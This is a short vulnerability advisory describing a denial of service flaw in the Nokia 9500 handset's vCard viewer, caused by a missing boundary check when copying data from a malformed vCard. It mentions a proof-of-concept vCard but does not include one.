Nokia 9500 handset vCard viewer is affected by a remote denial of service vulnerability.

This issue presents itself when the device handles a malformed vCard and fails to perform boundary checks prior to copying user-supplied data into a finite sized buffer.

Successful exploitation of this issue requires user interaction as a user is asked to accept the vCard followed by manually opening it.

The following proof of concept vCard is available:
